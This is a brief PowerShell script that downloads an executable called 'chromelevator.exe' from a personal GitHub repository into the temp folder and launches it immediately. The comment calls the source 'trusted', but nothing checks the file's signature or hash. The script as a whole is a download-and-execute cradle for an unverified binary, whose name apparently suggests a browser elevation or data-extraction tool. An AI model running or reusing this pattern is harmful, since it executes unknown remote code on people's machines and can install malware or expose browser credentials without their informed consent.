# Download + run EXE from trusted source
$url  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe"
$file = "$env:TEMP\chromelevator.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
